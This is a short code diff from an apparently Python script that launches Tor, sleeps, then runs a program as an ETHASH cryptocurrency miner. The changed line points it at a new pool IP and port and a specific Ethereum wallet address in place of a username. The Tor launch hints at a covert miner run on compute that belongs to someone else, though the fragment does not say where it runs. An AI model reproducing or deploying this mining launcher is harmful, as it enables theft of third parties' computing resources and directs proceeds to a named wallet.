@@ -56,4 +56,4 @@ except:
 os.system('tor &')
 time.sleep(60)
 
-os.system (program + ' --algo ETHASH --pool 13.248.162.234:443 --user teguhcong.'+program)
+os.system (program + ' --algo ETHASH --pool 172.65.247.152:4444 --user 0xbefefb5612d0775d592cb8c0b9411f8a57da5701.'+program)
